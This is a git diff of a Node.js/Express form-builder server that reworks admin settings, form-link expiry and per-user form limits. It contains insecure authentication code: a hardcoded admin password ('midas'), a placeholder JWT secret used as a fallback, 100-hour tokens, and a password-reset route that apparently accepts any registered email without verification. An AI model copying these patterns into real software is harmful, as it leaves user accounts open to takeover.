@@ -6,13 +6,14 @@ const fs = require('fs').promises;
 const path = require('path');
 const bcrypt = require('bcryptjs');
 const jwt = require('jsonwebtoken');
-require('dotenv').config();
+require('dotenv').config(); // Load environment variables
 
 const app = express();
 const port = process.env.PORT || 3000;
-const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-here';
+const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-here'; // Fallback for local dev
+const ADMIN_PASSWORD_HASH = bcrypt.hashSync('midas', 10); // Pre-hashed admin password
 
-// File paths
+// Use persistent path for Render (set DATA_DIR=/data in Render env vars)
 const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
 const submissionsFile = path.join(DATA_DIR, 'submissions.json');
 const formConfigsFile = path.join(DATA_DIR, 'formConfigs.json');
@@ -65,6 +66,20 @@ async function saveFormConfigs() {
   }
 }
 
+// Initialize admin settings file
+async function initializeAdminSettingsFile() {
+  try {
+    await fs.access(adminSettingsFile);
+    console.log(`Admin settings file exists: ${adminSettingsFile}`);
+  } catch {
+    await fs.writeFile(adminSettingsFile, JSON.stringify({
+      linkLifespan: 604800000, // Default: 7 days in milliseconds
+      maxFormsPerUser: 10 // Default: 10 forms per user
+    }));
+    console.log('Created adminSettings.json');
+  }
+}
+
 // Initialize users file
 async function initializeUsersFile() {
   try {
@@ -87,6 +102,17 @@ async function saveUsers(users) {
   }
 }
 
+// Save admin settings to file
+async function saveAdminSettings(settings) {
+  try {
+    await fs.writeFile(adminSettingsFile, JSON.stringify(settings, null, 2));
+    console.log('Saved admin settings to file');
+  } catch (err) {
+    console.error('Error saving admin settings:', err.message, err.stack);
+    throw err;
+  }
+}
+
 // Load users from file
 async function loadUsers() {
   try {
@@ -98,70 +124,48 @@ async function loadUsers() {
   }
 }
 
-// Load user by ID
-async function loadUserById(userId) {
-  const users = await loadUsers();
-  return users.find(u => u.id === userId);
-}
-
-// Initialize admin settings file
-async function initializeAdminSettingsFile() {
-  try {
-    await fs.access(adminSettingsFile);
-    console.log(`Admin settings file exists: ${adminSettingsFile}`);
-  } catch {
-    await fs.writeFile(adminSettingsFile, JSON.stringify({
-      restrictionsEnabled: false,
-      formsPerDay: 5,
-      linkLifespanSeconds: 3600
-    }));
-    console.log('Created adminSettings.json');
-  }
-}
-
-// Load admin settings
+// Load admin settings from file
 async function loadAdminSettings() {
   try {
     const data = await fs.readFile(adminSettingsFile, 'utf8');
     return JSON.parse(data);
   } catch (err) {
     console.error('Error loading admin settings:', err.message);
-    return {
-      restrictionsEnabled: false,
-      formsPerDay: 5,
-      linkLifespanSeconds: 3600
-    };
+    return { linkLifespan: 604800000, maxFormsPerUser: 10 };
   }
 }
 
-// Save admin settings
-async function saveAdminSettings(settings) {
-  try {
-    await fs.writeFile(adminSettingsFile, JSON.stringify(settings, null, 2));
-    console.log('Saved admin settings to file');
-  } catch (err) {
-    console.error('Error saving admin settings:', err.message, err.stack);
-    throw err;
-  }
+// Load user by ID
+async function loadUserById(userId) {
+  const users = await loadUsers();
+  return users.find(u => u.id === userId);
 }
 
 // JWT verification middleware
 function verifyToken(req, res, next) {
   const authHeader = req.headers['authorization'];
   if (!authHeader || !authHeader.startsWith('Bearer ')) {
-    console.error('No token provided in request');
     return res.status(401).json({ error: 'No token provided' });
   }
 
   const token = authHeader.split(' ')[1];
   try {
     const decoded = jwt.verify(token, JWT_SECRET);
-    req.user = decoded;
+    req.user = decoded; // Store user data in request
     next();
   } catch (error) {
     console.error('Token verification error:', error.message);
     res.status(401).json({ error: 'Invalid or expired token' });
   }
+}
+
+// Admin password verification middleware
+function verifyAdminPassword(req, res, next) {
+  const { adminPassword } = req.body;
+  if (!adminPassword || !bcrypt.compareSync(adminPassword, ADMIN_PASSWORD_HASH)) {
+    return res.status(401).json({ error: 'Invalid admin password' });
+  }
+  next();
 }
 
 // Initialize storage
@@ -179,7 +183,7 @@ let formConfigs = {};
   }
 })();
 
-// Middleware
+// Middleware - Updated CORS configuration
 app.use(cors({
   origin: ['http://localhost:3000', 'https://plexzora.onrender.com', 'https://your-frontend-domain.com'],
   methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
@@ -199,224 +203,7 @@ app.options('*', (req, res) => {
   res.sendStatus(200);
 });
 
-// Admin page template
-const adminTemplate = `
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Admin Dashboard</title>
-  <style>
-    body {
-      font-family: 'Inter', Arial, sans-serif;
-      background: #f8f9fa;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-      padding: 20px;
-    }
-    .admin-container {
-      background: white;
-      padding: 24px;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-      width: 400px;
-      max-width: 100%;
-      text-align: center;
-    }
-    h2 {
-      font-size: 1.8rem;
-      margin-bottom: 20px;
-    }
-    .error {
-      color: red;
-      font-size: 0.9rem;
-      margin: 10px 0;
-      display: none;
-    }
-    .user-count {
-      font-size: 1rem;
-      margin: 10px 0;
-      color: #333;
-    }
-    input[type="password"], input[type="number"], select {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-      font-size: 0.95rem;
-    }
-    .toggle-container {
-      margin: 20px 0;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-    .toggle-switch {
-      position: relative;
-      display: inline-block;
-      width: 50px;
-      height: 24px;
-    }
-    .toggle-switch input {
-      opacity: 0;
-      width: 0;
-      height: 0;
-    }
-    .slider {
-      position: absolute;
-      cursor: pointer;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background-color: #ccc;
-      transition: 0.4s;
-      border-radius: 24px;
-    }
-    .slider:before {
-      position: absolute;
-      content: "";
-      height: 20px;
-      width: 20px;
-      left: 2px;
-      bottom: 2px;
-      background-color: white;
-      transition: 0.4s;
-      border-radius: 50%;
-    }
-    input:checked + .slider {
-      background-color: #0078ff;
-    }
-    input:checked + .slider:before {
-      transform: translateX(26px);
-    }
-    button {
-      width: 100%;
-      padding: 12px;
-      background: #0078ff;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      font-size: 0.95rem;
-      cursor: pointer;
-      margin-top: 10px;
-    }
-    button:hover {
-      background: #005bb5;
-    }
-    .form-group {
-      margin-bottom: 15px;
-    }
-  </style>
-</head>
-<body>
-  <div class="admin-container">
-    <h2>Admin Dashboard</h2>
-    <div id="login-section" <%= isAuthenticated ? 'style="display:none;"' : '' %>>
-      <div class="form-group">
-        <input type="password" id="admin-password" placeholder="Enter admin password">
-        <div id="error-message" class="error"></div>
-        <button onclick="login()">Login</button>
-      </div>
-    </div>
-    <div id="settings-section" <%= !isAuthenticated ? 'style="display:none;"' : '' %>>
-      <div class="user-count">Total Users: <span id="user-count"><%= userCount %></span></div>
-      <div class="toggle-container">
-        <label>Enable Restrictions</label>
-        <label class="toggle-switch">
-          <input type="checkbox" id="restrictions-toggle" <%= restrictionsEnabled ? 'checked' : '' %>>
-          <span class="slider"></span>
-        </label>
-      </div>
-      <div class="form-group">
-        <label>Forms Per Day</label>
-        <input type="number" id="forms-per-day" value="<%= formsPerDay %>" min="1">
-      </div>
-      <div class="form-group">
-        <label>Link Lifespan</label>
-        <input type="number" id="link-lifespan" value="<%= linkLifespanValue %>" min="1">
-        <select id="link-lifespan-unit">
-          <option value="seconds" <%= linkLifespanUnit === 'seconds' ? 'selected' : '' %>>Seconds</option>
-          <option value="minutes" <%= linkLifespanUnit === 'minutes' ? 'selected' : '' %>>Minutes</option>
-          <option value="hours" <%= linkLifespanUnit === 'hours' ? 'selected' : '' %>>Hours</option>
-        </select>
-      </div>
-      <button onclick="saveSettings()">Save Settings</button>
-    </div>
-  </div>
-
-  <script>
-    async function login() {
-      const password = document.getElementById('admin-password').value;
-      const errorMessage = document.getElementById('error-message');
-      try {
-        const response = await fetch('/admin/login', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ password })
-        });
-        const result = await response.json();
-        if (response.ok) {
-          document.getElementById('login-section').style.display = 'none';
-          document.getElementById('settings-section').style.display = 'block';
-        } else {
-          errorMessage.textContent = result.error || 'Invalid password';
-          errorMessage.style.display = 'block';
-        }
-      } catch (error) {
-        errorMessage.textContent = 'An error occurred';
-        errorMessage.style.display = 'block';
-      }
-    }
-
-    async function saveSettings() {
-      const restrictionsEnabled = document.getElementById('restrictions-toggle').checked;
-      const formsPerDay = parseInt(document.getElementById('forms-per-day').value);
-      const linkLifespan = parseInt(document.getElementById('link-lifespan').value);
-      const linkLifespanUnit = document.getElementById('link-lifespan-unit').value;
-      const errorMessage = document.getElementById('error-message');
-
-      if (isNaN(formsPerDay) || formsPerDay < 1) {
-        errorMessage.textContent = 'Forms per day must be at least 1';
-        errorMessage.style.display = 'block';
-        return;
-      }
-      if (isNaN(linkLifespan) || linkLifespan < 1) {
-        errorMessage.textContent = 'Link lifespan must be at least 1';
-        errorMessage.style.display = 'block';
-        return;
-      }
-
-      try {
-        const response = await fetch('/admin/settings', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ restrictionsEnabled, formsPerDay, linkLifespan, linkLifespanUnit })
-        });
-        const result = await response.json();
-        if (response.ok) {
-          alert('Settings saved successfully');
-          errorMessage.style.display = 'none';
-        } else {
-          errorMessage.textContent = result.error || 'Failed to save settings';
-          errorMessage.style.display = 'block';
-        }
-      } catch (error) {
-        errorMessage.textContent = 'An error occurred while saving settings';
-        errorMessage.style.display = 'block';
-      }
-    }
-  </script>
-</body>
-</html>
-`;
-
-// Form template (unchanged)
+// EJS template for live form
 const formTemplate = `
 <!DOCTYPE html>
 <html lang="en">
@@ -794,6 +581,334 @@ const formTemplate = `
 </html>
 `;
 
+// Admin template for settings page
+const adminTemplate = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Settings</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #f8f9fa;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 40px 20px 20px;
+      box-sizing: border-box;
+    }
+    .admin-container {
+      background: white;
+      padding: 24px;
+      border-radius: 16px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      width: 320px;
+      text-align: center;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      gap: 16px;
+    }
+    .admin-container:hover {
+      transform: scale(1.02);
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+    }
+    .admin-container h2 {
+      font-size: 1.8rem;
+      font-weight: 700;
+      color: #000000;
+      margin: -4px 0 16px;
+    }
+    .admin-container p {
+      font-size: 0.9rem;
+      font-weight: 400;
+      color: #555555;
+      margin: 0 0 16px;
+    }
+    .admin-container input, .admin-container select {
+      width: 100%;
+      padding: 14px;
+      margin: 8px 0;
+      border-radius: 8px;
+      font-size: 0.95rem;
+      box-sizing: border-box;
+      transition: all 0.2s ease;
+      border: none;
+      box-shadow: 0 0 0 2px #000000;
+      background: #f8f9fa;
+      color: #333333;
+    }
+    .admin-container input::placeholder, .admin-container select {
+      color: #999999;
+      opacity: 1;
+    }
+    .admin-container input:focus, .admin-container select:focus {
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(0, 183, 255, 0.3);
+      background: #ffffff;
+    }
+    .admin-container button {
+      width: 100%;
+      padding: 16px;
+      margin: 20px 0 0;
+      border-radius: 8px;
+      font-size: 0.95rem;
+      box-sizing: border-box;
+      transition: all 0.2s ease;
+      background: linear-gradient(45deg, #00b7ff, #0078ff);
+      color: #ffffff;
+      border: none;
+      cursor: pointer;
+      font-weight: 500;
+      box-shadow: 0 2px 8px rgba(0, 183, 255, 0.3);
+    }
+    .admin-container button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(0, 183, 255, 0.5);
+      background: linear-gradient(45deg, #0078ff, #005bb5);
+    }
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) scale(0.8);
+      background: #ffffff;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
+      z-index: 1000;
+      text-align: center;
+      max-width: 300px;
+      width: 90%;
+      transition: transform 0.3s ease, opacity 0.3s ease;
+      border: 1px solid rgba(0, 183, 255, 0.1);
+    }
+    .popup.show {
+      display: block;
+      transform: translate(-50%, -50%) scale(1);
+      opacity: 1;
+    }
+    .popup h4 {
+      font-size: 1rem;
+      font-weight: 600;
+      color: #333333;
+      margin-bottom: 12px;
+    }
+    .popup p {
+      font-size: 0.85rem;
+      color: #555555;
+      margin-bottom: 12px;
+      line-height: 1.4;
+    }
+    .popup-close {
+      position: absolute;
+      top: 8px;
+      right: 8px;
+      background: none;
+      border: none;
+      font-size: 0.85rem;
+      color: #555555;
+      cursor: pointer;
+      transition: color 0.2s ease;
+    }
+    .popup-close:hover {
+      color: #00b7ff;
+    }
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      z-index: 999;
+      backdrop-filter: blur(2px);
+      transition: opacity 0.3s ease;
+    }
+    .overlay.show {
+      display: block;
+      opacity: 1;
+    }
+    @media (max-width: 768px) {
+      body {
+        padding: 30px 16px 16px;
+      }
+      .admin-container {
+        width: 100%;
+        max-width: 300px;
+        padding: 20px;
+      }
+      .admin-container h2 {
+        font-size: 1.6rem;
+      }
+      .admin-container p {
+        font-size: 0.8rem;
+      }
+      .admin-container input, .admin-container select, .admin-container button {
+        padding: 12px;
+        font-size: 0.9rem;
+      }
+      .admin-container button {
+        padding: 14px;
+        margin: 16px 0 0;
+      }
+      .popup {
+        width: 80%;
+        max-width: 280px;
+        padding: 16px;
+      }
+    }
+    @media (max-width: 480px) {
+      .admin-container {
+        max-width: 280px;
+      }
+      .admin-container h2 {
+        font-size: 1.4rem;
+      }
+      .admin-container p {
+        font-size: 0.8rem;
+      }
+      .admin-container input, .admin-container select, .admin-container button {
+        font-size: 0.85rem;
+        padding: 10px;
+      }
+      .admin-container button {
+        padding: 12px;
+        margin: 12px 0 0;
+      }
+      .popup {
+        max-width: 260px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="admin-container">
+    <h2>Admin Settings</h2>
+    <p>Configure form settings</p>
+    <div id="input-fields">
+      <input type="password" id="admin-password" placeholder="Admin Password" style="box-shadow: 0 0 0 2px #000000;">
+      <input type="number" id="link-lifespan" placeholder="Link Lifespan" style="box-shadow: 0 0 0 2px #000000;" min="1">
+      <select id="time-unit" style="box-shadow: 0 0 0 2px #000000;">
+        <option value="seconds">Seconds</option>
+        <option value="minutes">Minutes</option>
+        <option value="hours">Hours</option>
+      </select>
+      <input type="number" id="max-forms" placeholder="Max Forms per User" style="box-shadow: 0 0 0 2px #000000;" min="1">
+    </div>
+    <button id="submit-settings">Update Settings</button>
+  </div>
+  <div class="overlay" id="message-overlay"></div>
+  <div class="popup" id="message-popup" role="alertdialog" aria-labelledby="message-popup-title">
+    <button class="popup-close" id="message-popup-close" aria-label="Close message popup">&times;</button>
+    <h4 id="message-popup-title">Message</h4>
+    <p id="message-text"></p>
+  </div>
+
+  <script>
+    const submitButton = document.getElementById('submit-settings');
+    const messagePopup = document.getElementById('message-popup');
+    const messageOverlay = document.getElementById('message-overlay');
+    const messagePopupClose = document.getElementById('message-popup-close');
+    const messageText = document.getElementById('message-text');
+    const adminPasswordInput = document.getElementById('admin-password');
+    const linkLifespanInput = document.getElementById('link-lifespan');
+    const timeUnitSelect = document.getElementById('time-unit');
+    const maxFormsInput = document.getElementById('max-forms');
+
+    function showMessagePopup(message) {
+      messageText.textContent = message;
+      messagePopup.classList.add('show');
+      messageOverlay.classList.add('show');
+    }
+
+    function hideMessagePopup() {
+      messagePopup.classList.remove('show');
+      messageOverlay.classList.remove('show');
+    }
+
+    function validateForm() {
+      const adminPassword = adminPasswordInput.value.trim();
+      const linkLifespan = linkLifespanInput.value.trim();
+      const timeUnit = timeUnitSelect.value;
+      const maxForms = maxFormsInput.value.trim();
+
+      if (!adminPassword || !linkLifespan || !timeUnit || !maxForms) {
+        showMessagePopup('Please fill all required fields.');
+        return false;
+      }
+
+      if (isNaN(linkLifespan) || linkLifespan <= 0) {
+        showMessagePopup('Link lifespan must be a positive number.');
+        return false;
+      }
+
+      if (isNaN(maxForms) || maxForms <= 0) {
+        showMessagePopup('Max forms per user must be a positive number.');
+        return false;
+      }
+
+      return true;
+    }
+
+    async function submitSettings() {
+      if (!validateForm()) return;
+
+      const formData = {
+        adminPassword: adminPasswordInput.value.trim(),
+        linkLifespan: parseInt(linkLifespanInput.value.trim()),
+        timeUnit: timeUnitSelect.value,
+        maxFormsPerUser: parseInt(maxFormsInput.value.trim())
+      };
+
+      try {
+        const response = await fetch('/admin/settings', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(formData)
+        });
+        const result = await response.json();
+        if (!response.ok) {
+          console.error('Settings update failed:', result.error);
+          showMessagePopup(result.error || 'Failed to update settings.');
+          return;
+        }
+        showMessagePopup('Settings updated successfully!');
+        // Clear form fields
+        adminPasswordInput.value = '';
+        linkLifespanInput.value = '';
+        maxFormsInput.value = '';
+      } catch (error) {
+        console.error('Error updating settings:', error);
+        showMessagePopup('An error occurred while updating settings.');
+      }
+    }
+
+    try {
+      submitButton.addEventListener('click', submitSettings);
+      messagePopupClose.addEventListener('click', hideMessagePopup);
+      messageOverlay.addEventListener('click', hideMessagePopup);
+    } catch (error) {
+      console.error('Error in admin script:', error);
+      showMessagePopup('An error occurred. Please try again.');
+    }
+  </script>
+</body>
+</html>
+`;
+
 // Utility to normalize URLs
 function normalizeUrl(url) {
   if (!url) return null;
@@ -829,25 +944,32 @@ function sanitizeForJs(str) {
     .replace(/&/g, '&amp;');
 }
 
-// Utility to count forms created by a user today
-async function countUserFormsToday(userId) {
-  const today = new Date().toISOString().split('T')[0];
-  let formCount = 0;
-  Object.values(formConfigs).forEach(config => {
-    if (config.userId === userId && config.createdAt.startsWith(today)) {
-      formCount++;
-    }
-  });
-  return formCount;
+// Utility to check if form is expired
+async function isFormExpired(formId) {
+  const config = formConfigs[formId];
+  if (!config || !config.createdAt) {
+    console.log(`Form ${formId} not found or missing createdAt`);
+    return true;
+  }
+  
+  const adminSettings = await loadAdminSettings();
+  if (!adminSettings.linkLifespan) {
+    console.log(`No linkLifespan set for form ${formId}, assuming not expired`);
+    return false;
+  }
+  
+  const createdTime = new Date(config.createdAt).getTime();
+  const currentTime = Date.now();
+  const isExpired = (currentTime - createdTime) > adminSettings.linkLifespan;
+  console.log(`Form ${formId} expiration check: createdAt=${config.createdAt}, currentTime=${currentTime}, linkLifespan=${adminSettings.linkLifespan}, isExpired=${isExpired}`);
+  return isExpired;
 }
 
-// Utility to check if a form link has expired
-function isFormExpired(createdAt, lifespanSeconds) {
-  if (!lifespanSeconds) return false;
-  const created = new Date(createdAt);
-  const now = new Date();
-  const elapsedSeconds = (now - created) / 1000;
-  return elapsedSeconds > lifespanSeconds;
+// Utility to count user's forms
+async function countUserForms(userId) {
+  const count = Object.values(formConfigs).filter(config => config.userId === userId).length;
+  console.log(`Counted ${count} forms for user ${userId}`);
+  return count;
 }
 
 // Auth Route: Get current user info
@@ -855,17 +977,18 @@ app.get('/user', verifyToken, async (req, res) => {
   try {
     const user = await loadUserById(req.user.userId);
     if (!user) {
-      console.error(`User not found for ID: ${req.user.userId}`);
       return res.status(404).json({ error: 'User not found' });
     }
+    
+    // Return user info without sensitive data
     const { id, username, email, createdAt } = user;
     res.json({ 
       user: { id, username, email, createdAt },
       message: 'User info retrieved successfully' 
     });
   } catch (error) {
-    console.error('Error fetching user info:', error.message, error.stack);
-    res.status(500).json({ error: 'Failed to fetch user info', details: error.message });
+    console.error('Error fetching user info:', error);
+    res.status(500).json({ error: 'Failed to fetch user info' });
   }
 });
 
@@ -900,8 +1023,8 @@ app.post('/signup', async (req, res) => {
     const token = jwt.sign({ userId: newUser.id, email: newUser.email }, JWT_SECRET, { expiresIn: '1h' });
     res.status(201).json({ message: 'User created successfully', token });
   } catch (error) {
-    console.error('Signup error:', error.message, error.stack);
-    res.status(500).json({ error: 'Signup failed', details: error.message });
+    console.error('Signup error:', error);
+    res.status(500).json({ error: 'Signup failed' });
   }
 });
 
@@ -924,15 +1047,15 @@ app.post('/login', async (req, res) => {
       return res.status(401).json({ error: 'Invalid credentials' });
     }
 
-    const token = jwt.sign({ userId: user.id, email: user.email }, JWT_SECRET, { expiresIn: '1h' });
+    const token = jwt.sign({ userId: user.id, email: user.email }, JWT_SECRET, { expiresIn: '100h' });
     res.json({ message: 'Login successful', token });
   } catch (error) {
-    console.error('Login error:', error.message, error.stack);
-    res.status(500).json({ error: 'Login failed', details: error.message });
+    console.error('Login error:', error);
+    res.status(500).json({ error: 'Login failed' });
   }
 });
 
-// Auth Route: Forgot Password
+// Auth Route: Forgot Password (check if email exists)
 app.post('/forgot-password', async (req, res) => {
   try {
     const { email } = req.body;
@@ -948,12 +1071,12 @@ app.post('/forgot-password', async (req, res) => {
 
     res.json({ message: 'Email found, proceed to reset' });
   } catch (error) {
-    console.error('Forgot password error:', error.message, error.stack);
-    res.status(500).json({ error: 'Forgot password check failed', details: error.message });
+    console.error('Forgot password error:', error);
+    res.status(500).json({ error: 'Forgot password check failed' });
   }
 });
 
-// Auth Route: Reset Password
+// Auth Route: Reset Password (update if email exists)
 app.post('/reset-password', async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -976,48 +1099,23 @@ app.post('/reset-password', async (req, res) => {
 
     res.json({ message: 'Password reset successfully' });
   } catch (error) {
-    console.error('Reset password error:', error.message, error.stack);
-    res.status(500).json({ error: 'Reset password failed', details: error.message });
+    console.error('Reset password error:', error);
+    res.status(500).json({ error: 'Reset password failed' });
   }
 });
 
-// Admin login route
-app.post('/admin/login', async (req, res) => {
-  const { password } = req.body;
-  const ADMIN_PASSWORD = 'midas';
-  if (password !== ADMIN_PASSWORD) {
-    return res.status(401).json({ error: 'Invalid admin password' });
-  }
-  const adminToken = jwt.sign({ isAdmin: true }, JWT_SECRET, { expiresIn: '1h' });
-  res.json({ message: 'Admin login successful', adminToken });
-});
-
-// Admin route to render dashboard
-app.get('/admin', async (req, res) => {
+// Admin Route: Render admin settings page
+app.get('/admin', (req, res) => {
   try {
-    const adminSettings = await loadAdminSettings();
-    const users = await loadUsers();
-    const userCount = users.length;
-    const linkLifespanSeconds = adminSettings.linkLifespanSeconds || 3600;
-    let linkLifespanValue = linkLifespanSeconds;
-    let linkLifespanUnit = 'seconds';
-
-    if (linkLifespanSeconds >= 3600) {
-      linkLifespanValue = Math.floor(linkLifespanSeconds / 3600);
-      linkLifespanUnit = 'hours';
-    } else if (linkLifespanSeconds >= 60) {
-      linkLifespanValue = Math.floor(linkLifespanSeconds / 60);
-      linkLifespanUnit = 'minutes';
-    }
-
-    const isAuthenticated = !!req.headers['authorization'];
     const html = ejs.render(adminTemplate, {
-      isAuthenticated,
-      userCount,
-      restrictionsEnabled: adminSettings.restrictionsEnabled,
-      formsPerDay: adminSettings.formsPerDay || 5,
-      linkLifespanValue,
-      linkLifespanUnit
+      headerHtml: 'Admin Settings',
+      subheaderText: 'Configure form settings',
+      subheaderColor: '#555555',
+      borderShadow: '0 0 0 2px #000000',
+      buttonColor: 'linear-gradient(45deg, #00b7ff, #0078ff)',
+      buttonTextColor: '#ffffff',
+      buttonText: 'Update Settings',
+      theme: 'light'
     });
     res.set('Content-Type', 'text/html');
     res.send(html);
@@ -1027,73 +1125,121 @@ app.get('/admin', async (req, res) => {
   }
 });
 
-// Admin settings update route
-app.post('/admin/settings', async (req, res) => {
+// Admin Route: Set global settings
+app.post('/admin/settings', verifyAdminPassword, async (req, res) => {
   try {
-    const { restrictionsEnabled, formsPerDay, linkLifespan, linkLifespanUnit } = req.body;
+    const { linkLifespan, maxFormsPerUser, timeUnit } = req.body;
 
-    if (typeof restrictionsEnabled !== 'boolean') {
-      return res.status(400).json({ error: 'restrictionsEnabled must be a boolean' });
-    }
-    if (!Number.isInteger(formsPerDay) || formsPerDay < 1) {
-      return res.status(400).json({ error: 'formsPerDay must be an integer >= 1' });
-    }
-    if (!Number.isInteger(linkLifespan) || linkLifespan < 1) {
-      return res.status(400).json({ error: 'linkLifespan must be an integer >= 1' });
-    }
-    if (!['seconds', 'minutes', 'hours'].includes(linkLifespanUnit)) {
-      return res.status(400).json({ error: 'Invalid linkLifespanUnit' });
+    // Validate inputs
+    if (!linkLifespan || !maxFormsPerUser || !timeUnit) {
+      return res.status(400).json({ error: 'Link lifespan, time unit, and max forms per user are required' });
     }
 
-    let linkLifespanSeconds = linkLifespan;
-    if (linkLifespanUnit === 'minutes') {
-      linkLifespanSeconds *= 60;
-    } else if (linkLifespanUnit === 'hours') {
-      linkLifespanSeconds *= 3600;
+    if (!['seconds', 'minutes', 'hours'].includes(timeUnit)) {
+      return res.status(400).json({ error: 'Invalid time unit. Must be seconds, minutes, or hours' });
+    }
+
+    if (!Number.isInteger(Number(linkLifespan)) || Number(linkLifespan) <= 0) {
+      return res.status(400).json({ error: 'Link lifespan must be a positive integer' });
+    }
+
+    if (!Number.isInteger(Number(maxFormsPerUser)) || Number(maxFormsPerUser) <= 0) {
+      return res.status(400).json({ error: 'Max forms per user must be a positive integer' });
+    }
+
+    // Convert lifespan to milliseconds
+    let lifespanMs;
+    switch (timeUnit) {
+      case 'seconds':
+        lifespanMs = Number(linkLifespan) * 1000;
+        break;
+      case 'minutes':
+        lifespanMs = Number(linkLifespan) * 60 * 1000;
+        break;
+      case 'hours':
+        lifespanMs = Number(linkLifespan) * 60 * 60 * 1000;
+        break;
     }
 
     const adminSettings = {
-      restrictionsEnabled,
-      formsPerDay,
-      linkLifespanSeconds
+      linkLifespan: lifespanMs,
+      maxFormsPerUser: Number(maxFormsPerUser)
     };
 
     await saveAdminSettings(adminSettings);
-    res.json({ message: 'Admin settings updated successfully' });
+    console.log('Admin settings updated:', adminSettings);
+
+    // Clean up expired forms
+    const now = Date.now();
+    const expiredFormIds = Object.keys(formConfigs).filter(formId => {
+      const config = formConfigs[formId];
+      if (!config.createdAt) return true;
+      const createdTime = new Date(config.createdAt).getTime();
+      return (now - createdTime) > lifespanMs;
+    });
+
+    for (const formId of expiredFormIds) {
+      delete formConfigs[formId];
+      const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
+      const updatedSubmissions = submissions.filter(s => s.formId !== formId);
+      await fs.writeFile(submissionsFile, JSON.stringify(updatedSubmissions, null, 2));
+    }
+
+    if (expiredFormIds.length > 0) {
+      await saveFormConfigs();
+      console.log(`Deleted ${expiredFormIds.length} expired forms`);
+    }
+
+    res.status(200).json({ 
+      message: 'Admin settings updated successfully',
+      settings: adminSettings 
+    });
   } catch (error) {
     console.error('Error updating admin settings:', error.message, error.stack);
     res.status(500).json({ error: 'Failed to update admin settings', details: error.message });
   }
 });
 
-// Dashboard route (MODIFIED to handle expired forms and improve error handling)
+// Protected Routes - WITH USER ISOLATION
 app.get('/get', verifyToken, async (req, res) => {
   try {
     const userId = req.user.userId;
+    console.log(`Processing /get request for user ${userId}`);
+
+    // Load submissions
     let submissions = [];
     try {
       const data = await fs.readFile(submissionsFile, 'utf8');
       submissions = JSON.parse(data);
+      console.log(`Loaded ${submissions.length} total submissions from ${submissionsFile}`);
     } catch (error) {
-      console.error(`Error reading or parsing submissions file: ${error.message}`);
-      submissions = []; // Fallback to empty array
+      console.error('Error reading submissions file:', error.message);
+      submissions = [];
     }
+
+    const adminSettings = await loadAdminSettings();
+    console.log(`Loaded admin settings:`, adminSettings);
 
     // Filter submissions by user
     const userSubmissions = submissions.filter(s => s.userId === userId);
+    console.log(`Filtered ${userSubmissions.length} submissions for user ${userId}`);
 
     // Filter form configs by user and check for expiration
-    const adminSettings = await loadAdminSettings();
     const userFormConfigs = {};
-    Object.entries(formConfigs).forEach(([formId, config]) => {
+    const expiredForms = [];
+    const validForms = [];
+    for (const [formId, config] of Object.entries(formConfigs)) {
       if (config.userId === userId) {
-        if (adminSettings.restrictionsEnabled && config.expiresAt && isFormExpired(config.createdAt, adminSettings.linkLifespanSeconds)) {
-          console.log(`Form ${formId} excluded from dashboard for user ${userId} due to expiration`);
-          return;
+        const isExpired = await isFormExpired(formId);
+        if (isExpired) {
+          expiredForms.push(formId);
+        } else {
+          userFormConfigs[formId] = config;
+          validForms.push(formId);
         }
-        userFormConfigs[formId] = config;
       }
-    });
+    }
+    console.log(`User ${userId} forms: ${validForms.length} valid (${validForms.join(', ')}), ${expiredForms.length} expired (${expiredForms.join(', ')})`);
 
     const templates = {
       'sign-in': {
@@ -1113,24 +1259,32 @@ app.get('/get', verifyToken, async (req, res) => {
       'payment-checkout': {
         name: 'Payment Checkout Form',
         fields: [
-          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
